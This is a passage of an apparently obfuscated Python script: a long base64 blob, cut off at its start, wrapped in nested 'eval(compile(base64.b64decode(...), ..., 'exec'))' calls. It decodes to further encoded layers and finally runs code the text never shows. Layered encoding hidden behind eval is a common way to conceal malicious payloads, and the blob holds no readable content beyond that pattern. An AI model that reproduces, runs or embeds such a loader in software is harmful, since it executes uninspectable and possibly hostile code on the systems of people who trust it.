lZiVlpYWVVWc1lXVnJXbWhWYlRWdVRVWmtjMVZ0ZEZwTmJGcEpWa2N4TUZkV1RraFpla0pZVmtWWk1GUnJWWGhTVmtaMFZHMTRVMUl5VVhwV01GWnZZakpHVms1WVRteFNSa3BQVm10a2IyRnNjRlpWYkZwc1VtMW9TbGxWWkhOVU1ERlpXbnBDVlZaRmNFaFhWRXBYVWxaU1ZWRnNiRlJTTW1nd1ZrUkdZVTVGTlVaTldGSlZZbFUxYzFWclZuZGtSbVJHWVVjMVRrMVlRbGhhVlZKVFZHeEtSMk5IY0dGV1ZrcDVWRlphYjFOV2NEWlZhelZYWW0xamQxWkdWbXRXTVd0NVZtdFdVMWRIZUZwVk1HUnZaRVpSZDFkcVVrOVNWRlpKVlRJeFQySkdTa2RTYWxKWVVsZG9kVlJYZUhkV01sWkZWV3h3YUdGNlZuRlhiRlpyVm0xV1IyRkZiR2hTTTJoUlZtMDFiazFHVWxaVmJVWmFUV3hhU1ZVeGFHdFhWazVJV2tSV1dGWkZXVEJVYTFWNFYwWldkRlJ0ZUZOU01rNDFWakJXYjJKck1IZFBWV1JzVWtaS1VGbHNWVEZoYkhCV1ZXdGFiRlp0YUVwWGFrNTNWMnhhZFZwNlFsVmlia0pFVjFSS1YxSlhSWHBqUm14VVVqSm9lVlpFUm1GT1JUVkhZMFZXVldKVk5YTlZhMlF3VGxaa1JtRkhPV2xXVkd4WVdsVlNVMVJzU1hoWGJYQmhWbGRTV0ZsV1dtOVRWMFpJWTBkR1YySnRZM2RXUm1SM1VURnJlVlpyYUZWV1JYQmFWVEJrYW1ReFVsVlNhbEpQVW01Q1JsbFZaRTlpUmtsNFUyNVNXRkpYYUhaWlZscDNWakpXUlZWc2NGZFNNbWh4VjJ4V1UyTnJOVmRoUld4aFpXdGFVRlZ0Tlc1TlJsRjRXa1prV2sxc1drWldWbEpEVjFaT1NHRklVbGhXYkc4d1ZHdFZlR05YUmtoVWJYaFRVak5vTUZZd1ZtOWliVlpIWTBaa2JGSkdTbEJVVjNSaFlXeHdWbHBHV2s5V2JXaEtWMnBPYzFsV1duVmFla0pWVFVaS1NGZFVTbGRTVmxwWldrWnNWRkl5YUhsV1JsWmhUa1UxUmsxVlZsWmlWVFZ6Vld0Vk1XTnNaRVpoUnpWT1RWaENTRnBWVWxOWGJVWnpZMGR3WVZaV1NtRlViRnB2VTFad05sRnNjRTVYUjJOM1ZqSjRVMUl4YTNsV2ExWlVWa1ZLV2xVd1pHcGxWbEpYVjJwU1QxSlVSbFpWYlRGUFlrWkplR0Y2UmxoU1YyaDFXbFZhY21WSFZrVlZiRUpYVWxad2NWZHNWbE5oYXpWWFlVVnNZVTB5ZUU5WmEyaHVUVVprYzFWdE9WcE5iRnBKVmtab2ExZFdUa2haZWtaWVZqTm5NRlJyVlRWVFJscDBWRzE0VTFJeFNucFdNRlp2WW1zeFJrNUlhR3hTUmtwUlZXcEdZV0ZzY0ZaYVJscE9VbTFvU2xkdWNFdFhiVXBKV25wQ1dHRXlVa3hYVkVwWFVsZEtTR1JHYkZSU01rNHpWakowWVU1Rk5VZGlTRkpXWWxVMWMxVnJWWGhOTVdSR1lVYzFUMUp1UWxoYVZWSlRWVVpLUms1WGNHRldWa3BJV1d0YWIxTldiM3BqUm5CcFUwZGpkMVl4V2xOak1XdDVWbXRvV0dKWWFGcFZNR1J2WkVaa1ZWSnFVazlTYmtKNFZUSXhUMkpHU2tkV1dHeFlVbGRvZGxsVVFYaGpNbFpGVldzNVYxSXhTbkZYYkZaVFlXc3hWMkZGYkdGTk0wSlBWbTAxYmsxR1VuUmpSVTVhVFd4YVJsZHJaREJYVms1SVdrUmFWVlpGV1RCVWExVjNaVlpPZEZSdGVGTlNNREIzVmpCV2IySXlSa1pOVm1Sc1VrWkthRlZyV21GaGJIQldWV3MxVGxadGFFcFhhazV2VkRBeFdWcDZRbFZXYkVweVYxUktWMU5HVWxsaFJteFVVakpPTTFaRVJtRk9SVFZHVGxWV1ZXSlZOWE5WYWtaM1l6RmtSbUZITlU1TlJGWjZXbFZTVTFkc1dYaFRiWEJoVmxaS1lWUlZXbTlUVm05NllrWkNWMkp0WTNkV1JFSlRZekZyZVZaclZsaGlWMmhhVlRCa2IyTldaSEpYYWxKUFVtNUNlRlZYTVU5aVJrcElWR3BhV0ZKWGFIWlpWRVp5WlVkV1JWVnJPVk5TV0VKeFYyeFdhMUpyTVhOaFJXeG9Vak5vVDFWdE5XNU5SbEp5Vld4T1drMXNXa1pXUm1oelYxWk9TR0ZJVWxWTlZtOHdWR3RWZDJWV1VuUlViWGhUVW10V05sWXdWbTlpTWtWM1RWaE9iRkpHU2s5WlYzUmhZV3h3VmxWdE5VOVNiV2hLV1ZWamVGUnRTa2xhZWtKWVlsUkdVRmRVU2xkVFJtUlZWR3hzVkZJeWFIWldNakUwVGtVMVIyTklVbFJpVlRWelZXdFdjazFHWkVaaFJ6Vk9UVVJXU0ZwVlVsTlhiVVp5VGxkd1lWWlhVbUZVVkVadlUxZEdTRTFXY0dsVFIyTjNWa2Q0VTFVeGEzbFdhMVpZWWxoU1dsVXdaRzlrUm1SWFYycFNUMUpVUm5oV01qRlBZa1pLUmsxVVVsaFNWMmgyV1ZSR2QxSXlWa1ZWYlVaVFVtdHdjVmRzVmxOWlYwcEhZVVZzWVUweWFGRlZiVFZ1VFVaU1dFMVhSbHBOYkZwR1ZURlNUMWRXVGtoYVJGSlZWbFp2TUZSclduZGtSbHAwVkcxNFUwMVdWak5XTUZadlltMVdjMk5GWkd4U1JrcFFWV3RrYjJGc2NGWlZiazVwVm0xb1NsZHVjRWRWUmxwMVducENXRlp0VW1oWFZFcFhVbFprZEdKR2JGUlNNbEY2VmtaYVlVNUZOVVpPVkZwVVlsVTFjMVZyWkZOaU1XUkdZVWM1YUZKVVJraGFWVkpUVlVaWmVHTkhjR0ZXVmtwRFZHeGFiMU5XYjNwaVJUbFRZbTFqZDFZeWVGTldNV3Q1Vm10V1dGWkZjRnBWTUdSdlkxWlNjVkpxVWs5U1ZGWkpWbGN4VDJKR1NrWmpTRTVZVWxkb2RsbFVRWGhXTWxaRlZXMUdhVlpyY0hGWGJGWnJWbXMxVjJGRmJHRmxiRnBQVlcwMWJrMUdVWGhWYlVaYVRXeGFTVlp0TVRCWFZrNUlXVE5rVlZaV2J6QlVhMXB6VmxaYWRGUnRlRk5TVm5CM1ZqQldiMkp0Vm5KUFZtUnNVa1pLVVZWcVFtRmhiSEJXV2tWd1RtSkhhRXBaVldONFdWWktkVnA2UWxoaE1sSlFWMVJLVjFKV1ZsVlZiR3hVVWpKb2RsWkhNVFJPUlRWR1RWWm9XR0pWTlhOVmExcHlaREZrUm1GSE5XeFNWRlo2V2xWU1UxZHNXWGhYYlhCaFZsWktSRmxVUm05VFZuQTJVMnhDVjJKdFkzZFdSelYzVVRGcmVWWnJWbEpYUjJoYVZUQmtiMk14WkhOWGFsSlBVbFJHUmxWWE1VOWlSa2w0Vm1wT1dGSlhhSFpaVkVFd1pVZFdSVlZyT1ZkTldFSnhWMnhXVTJKdFZrZGhSV3hoWld4YVVGbHJhRzVOUm1SeVZXdGtXazFzV2taWFZFNXJWMVpPU0dGSVJsVmhNVzh3Vkd0Vk5WSldaSFJVYlhoVFRVWlplbFl3Vm05aU1rWlhZa1prYkZKR1NtRlpWekUwWVd4d1ZsVnNUbWhpUjJoS1dWVmtkMVF3TVZsYWVrSlZUVlpLVEZkVVNsZFNWa3BWVm14c1ZGSXlVWHBXTVZwaFRrVTFSMkpHYUZkaVZUVnpWV3BHVm1ReFpFWmhSemxwVW01Q1dGcFZVbE5VTVZwR1UyMXdZVlpYVWxoWmJGcHZVMVp3TmxWdFJsTmliV04zVmtkNGExVXhhM2xXYTJoWVZrVndXbFV3Wkd0T1ZsSldWMnBTVDFKdVFsbFdNakZQWWtaS1IxWlVRbGhTVjJoMldWWmFjMVl5VmtWVmJVWlRVbFJXY1Zkc1ZsTlZhelZIWVVWc2FGSXphRkJWYlRWdVRVWlNXV05JVGxwTmJGcEdWVlpTUzFkV1RraGFSRTVWVmxadk1GUnJXbmRUUmxKMFZHMTRVMUl4U25oV01GWnZZbTFSZUdORlpHeFNSa3BQV1d4YVMyRnNjRlpWYXpsb1VtMW9TbGR1Y0VkVU1VcDFXbnBDVldKR1NsaFhWRXBYVTBaS2RHSkdiRlJTTWxGNlZrUkNZVTVGTlVkalJXaFRZbFUxYzFWcVFtRmpSbVJHWVVjNWFWSnRkRFJhVlZKVFZESktWbU5IY0dGV1ZrcE1XVlphYjFOV2NEWlViVVpwVTBkamQxWkVSbE5XTVd0NVZtdFdhRkl6VWxwVk1HUnJUVEZTYzFkcVVrOVNia0pHVmpJeFQySkdTWGhXV0d4WVVsZG9kVnBYYzNkbFIxWkZWV3MxVjFKVVZuRlhiRlpUWVcxV1IyRkZiR2hTZWtaUlZXMDFiazFHVW5OVmJHUmFUV3hhU1ZZeU1XOVhWazVJV1ROc1ZWWXpaekJVYTFwelkxWldkRlJ0ZUZOTlYzTjNWakJXYjJKdFVYaGhNMmhzVWtaS1VGWnFRbmRoYkhCV1drVndUbFp0YUVwWlZXUTBWR3hLZFZwNlFsaFdiVkpJVjFSS1YxTkdTbFZSYkd4VVVqSlJNVlpHV21GT1JUVkhZMFZXVTJKVk5YTlZha1p5WkRGa1JtRkhOVTlTYlhRMFdsVlNVMVF4U1hkWGJYQmhWbFpLUTFwWGVHOVRWbTk2WWtVMVYySnRZM2RXUjNSVFZqRnJlVlpyYUZaaVdFSmFWVEJrYjJJeFpIUmxSRkpQVWxSU05WWnRNVTlpUmtwR1kwaENXRkpYYUhWYVZWVXhWakpXUlZWc1FsTk5WbkJ4VjJ4V1UyRXlSa2RoUld4b1VucEdZVlJXYUc1TlJtUlpZMGQwV2sxc1drbFdiVEZ2VjFaT1NHRklTbFZOUm04d1ZHdFZOVkpXY0VoVWJYaFRVbFpaZWxZd1ZtOWlhekZHVFZWa2JGSkdTazlXYTFaTFlXeHdWbHBHWkdsV2JXaEtWMnBPYTFkck1WbGFla0pWVFVkU2FGZFVTbGRUUms1MFlVWnNWRkl5VVRCV1IzQkhUa1UxUms5VmFGaGlWVFZ6Vld0YVJtVldaRVpoUnpWT1ZsUkdlbHBWVWxOWlZsbDNUbGR3WVZaWFVrZFViRnB2VTFkR1NHVkZPV2xUUjJOM1ZqRm9kMU14YTNsV2EyaFhZbGRvV2xVd1pHdE5NVkpXVjJwU1QxSlVSVEpaVldSUFlrWktSazFJYkZoU1YyaDFWRlpWTVZJeVZrVlZiSEJzWVRCd2NWZHNWbE5TYXpGSFlVVnNhRkl5YUdoWmEyaHVUVVpTVmxWc1pGcE5iRnBHVmpGU1UxZFdUa2haTTNCVlZrVlpNRlJyVlhoV1YwWklWRzE0VTAxV2NIZFdNRlp2WW1zMVZrOVdaR3hTUmtwUlZtdFdZV0ZzY0ZaVmJIQk9WbTFvU2xkdWNFdFpWbHAxV25wQ1dGWjZSbGhYVkVwWFUwWmFkRTFXYkZSU01rNDBWakZTUjA1Rk5VWlBWVlpoVWpBMWMxVnJXbmRqVm1SR1lVYzFUbEpVUm5wYVZWSlRWRzFLVmxkdGNHRldWa3BIV2xaYWIxTlhSa2hsUmtKVFltMWpkMVl4YUhkaE1XdDVWbXRXYUdWck5WcFZNR1J2WTBaU2NsZHFVazlTVkVaNFZWY3hUMkpHU2taT1dGSllVbGRvZFZwWGMzaFNNbFpGVlcxR1UxSXphSEZYYkZaclZUSkdjMkZGYkdGbGEzQlFWRlpvYmsxR1VsaGpSVTVhVFd4YVNWVXhVa05YVms1SVdrUlNWV0ZyV1RCVWExcHpaRVpXZEZSdGVGTlNWVmt4VmpCV2IySnRWa1pOVldSc1VrWktVVlpyWkZOaGJIQldWV3RhVGxKdGFFcFhibkJYVkdzeFdWcDZRbFZYU0VKSVYxUktWMUpXWkZWU2JHeFVVakpPTTFZeWRHRk9SVFZHVDFab1dHSlZOWE5WYTJRMFpFWmtSbUZITld4V1ZGWklXbFZTVTFSc1NrWmpSM0JoVmxaS1ExUlZXbTlUVm05NllrZEdhVk5IWTNkV1JtTjRWakZyZVZacmFGUmlWM2hhVlRCa2FtVkdVWGRYYWxKUFVtMTRXVll5TVU5aVJrcEdUVlJXV0ZKWGFIVmFWVnAzWXpKV1JWVnJPVTVpUm5CeFYyeFdVMVJyTVZkaFJXeGhaV3R3VDFadE5XNU5SbVJZVFZaT1drMXNXa1pXUmxKTFYxWk9TR0ZJU2xWV1ZtOHdWR3RWTVZkR1pIUlViWGhUVWpBd2QxWXdWbTlpYlZaV1RWWmtiRkpHU21oWmJGWmhZV3h3VmxWcmNFOVNiV2hLV1ZWa2MxUXhXblZhZWtKWVZrVndTRmRVU2xkU1YwWklUVlpzVkZJeWFEQldNVkpIVGtVMVJrNVlSbE5pVlRWelZXdGthMDB4WkVaaFJ6Vk9ZWHBHV0ZwVlVsTlViRmw0VTIxd1lWWlhVbWhaVlZwdlUxZEdTRTFYUm1sVFIyTjNWakZqZUZNeGEzbFdhMVpVVjBkb1dsVXdaR3RPYkZKWVpVUlNUMUp1UWtaWmEyUlBZa1pLUms1WE9WaFNWMmgyV1ZaVmVGSXlWa1ZWYXpsWFRWVndjVmRzVmxOVk1rWlhZVVZzYUZJemFGQlZiVFZ1VFVaa1YxVnRkRnBOYkZwR1ZURm9hMWRXVGtoWmVrWllWa1ZaTUZSclZURmtSazUwVkcxNFUwMUlRbmhXTUZadllqSkZlR05HWkd4U1JrcFBWbXBHUzJGc2NGWmFSWFJvVW0xb1NsbFZaRzlaVmxwMVducENXRmRJUW5wWFZFcFhVMFpTV1dOR2JGUlNNbEY2VmpKNFlVNUZOVVpOVm1oVFlsVTFjMVZxUmtaTlZtUkdZVWM1YVZadVFraGFWVkpUVjJ4YVIxZHRjR0ZXVmtwaFZGUkdiMU5XYjNwYVJuQnBVMGRqZDFZeU1IaFRNV3Q1Vm10b1ZtSlhlRnBWTUdSdlpFWlJlRmRxVWs5U1ZFWkdXVlZrVDJKR1NrWmpTRTVZVWxkb2RsbFZWVEZqTWxaRlZXeENWMUl5YUhGWGJGWlRWVzFXYzJGRmJHRk5NMEpRVkZab2JrMUdVbGxqUlRsYVRXeGFSbGxZY0ZOWFZrNUlZVWM1VlZZelp6QlVhMVY0VG14YWRGUnRlRk5OUm5CM1ZqQldiMkl5U2xkaVJtUnNVa1pLVVZWclZtRmhiSEJXVlcxd1RtSkhhRXBaVldONFZHeGFkVnA2UWxWV00wSklWMVJLVjFOR1pIUmhSbXhVVWpKT00xWkhlR0ZPUlRWSFkwWm9WMkpWTlhOVmFrSnlUVVprUm1GSE5XeFdiWGg2V2xWU1UxUXdNWE5qUjNCaFZsZFNWMVJyV205VFYwWklUVlU1VGxkSFkzZFdNblJyVkRGcmVWWnJWbGhXUlRWYVZUQmthazFXVVhkWGFsSlBVbFJGTWxaWE1VOWlSa2wzVFZST1dGSlhhSFpaYTFVeFVqSldSVlZyTldsV2EzQnhWMnhXVTJGck1VZGhSV3hoWld4S1lWUldhRzVOUmxGM1drVjBXazFzV2taVmJHaHZWMVpPU0ZremJGVmhNVzh3Vkd0VmVHUkdaSFJVYlhoVFVtdHdNRll3Vm05aWF6QjNUbFZrYkZKR1NrOVpiRlV4WVd4d1ZscEZaR2xTYldoS1dWVmtkMWxXU25WYWVrSlZUVWRTV0ZkVVNsZFNWbEpWVld4c1ZGSXlUak5XUm1RMFRrVTFSMkpJUmxSaVZUVnpWV3RhUjA1c1pFWmhSemxvVWxSc1NGcFZVbE5YYlVaelUyMXdZVlpYVWxoWlZFWnZVMVp2ZWxwRk9WTmliV04zVmpJeGQySXhhM2xXYTFaV1ZrVmFXbFV3Wkc5a1JtUnlWMnBTVDFKVVZqQldiVEZQWWtaS1NGUnFVbGhTVjJoMVZGWlZOVkl5VmtWVmF6bHBWbXh3Y1Zkc1ZsTmlhekZ6WVVWc1lXVnJOVkZWYlRWdVRVWlNXRTFWWkZwTmJGcEdWMWh3UjFkV1RraGFSRkpWVmxadk1GUnJWWGhqVmtaMFZHMTRVMUl4U25wV01GWnZZakpLVjJOSVRteFNSa3BvV1Zkek1XRnNjRlpWYkhCT1ZtMW9TbGR1Y0ZkVWF6RlpXbnBDV0ZZelFsaFhWRXBYVWxaa1ZWWnNiRlJTTW1oNFZrUkNZVTVGTlVkaE0yeFVZbFUxYzFWcVFuTk9iR1JHWVVjMWJGSnVRa2hhVlZKVFZVWmFSMk5IY0dGV1ZrcDJXVlJHYjFOV2NEWlZhemxwVTBkamQxWkdWbE5pTVd0NVZtdFdhVko2UmxwVk1HUnJUbFprVjFkcVVrOVNiWGg0Vm0weFQySkdTWGhoTTJ4WVVsZG9kVnBYZUhkak1sWkZWVzFHVjAxRVZuRlhiRlpyVkdzeGMyRkZiR2hTTTBKUFdXdG9iazFHWkhKYVJtUmFUV3hhUmxkclpEUlhWazVJV2tST1ZXSkdiekJVYTFWNFkxWmFkRlJ0ZUZOU1YzUTFWakJXYjJJeVJYaGpSV1JzVWtaS1VGWnFRbUZoYkhCV1ZXMDVhRkp0YUVwWGJuQkhWR3hhZFZwNlFsVk5Sa3A2VjFSS1YxTkdVbFZWYkd4VVVqSlJNbFpHVWtkT1JUVkhZMFpXVkdKVk5YTlZhMVp5WlVaa1JtRkhOV3hTVkd4WVdsVlNVMVF4V2taT1YzQmhWbFpLUTFwWGVHOVRWbTk2WTBVMVUySnRZM2RXUjNoVFV6RnJlVlpyVm1oU00xSmFWVEJrYjJOc1pISlhhbEpQVW01Q2VGVnRNVTlpUmtwR1lrUmFXRkpYYUhaWlZsVXdaVWRXUlZWck5XbFdWRlp4VjJ4V2ExUnJNWE5oUld4aFpXczFVRlJXYUc1TlJtUnpWV3hPV2sxc1drWldSbEpEVjFaT1NHRklVbGhXYkc4d1ZHdGFjbVZXVG5SVWJYaFRVbXhaTWxZd1ZtOWlhekZ6WTBaa2JGSkdTbWhaVjNSM1lXeHdWbHBGWkdoU2JXaEtXVlZrTkZSc1duVmFla0pWWWxSR1NGZFVTbGRTVmtaVlVtdDBiRll6VFRWVFYyUjNZa2RTZEZKdVRreFNNRFV5V1d4b1EyTkhTa2hXVnpsYVlsVmFObGRzVWxwTlJYaDBVMVJLVDFJeFNuTlhWRWsxWVRGd1ZHRklXbFZOUkdneldXcEpOV1JzVVhkUFNFSk5VVEJHY0ZWRmFFOU5SMDUwWWtoV1lXVnFVbkJVUlU1Q1lteHdXV0ZIZUZwbFYwNTNVekZGT1ZCVFNVdGFXRnBvWWtOb2FtSXlNWGRoVjNoc1MwZEthR015VlRKT1F6VnBUbXBTYTFwWFRuWmFSMVZ2WWpBNVVFMUhPWFppTURsUVMxTjNaMGxxZUhwa1NFcHdZbTFqSzBscGQyZEtNbFkwV2xkTmJrdFRhejBpQ21WMllXd29ZMjl0Y0dsc1pTaGlZWE5sTmpRdVlqWTBaR1ZqYjJSbEtHOVBUekJ2YjI5UFR5a3NJQ0k4YzNSeWFXNW5QaUlzSUNkbGVHVmpKeWtwIgpldmFsKGNvbXBpbGUoYmFzZTY0LmI2NGRlY29kZShvT08wb29vT08pLCAiPHN0cmluZz4iLCAnZXhlYycpKQ=="
eval(compile(base64.b64decode(oOO0oooOO), "<string>", 'exec'))"
eval(compile(base64.b64decode(oOO0oooOO), "<string>", 'exec'))